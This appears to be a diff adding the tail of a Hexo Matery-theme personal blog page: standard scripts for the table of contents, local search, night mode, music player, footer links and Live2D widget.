+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <a href="/about" target="_blank">l1b3r</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/l1b3ri" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:244004036@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=244004036" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 244004036" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/haru01.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+
+</html>
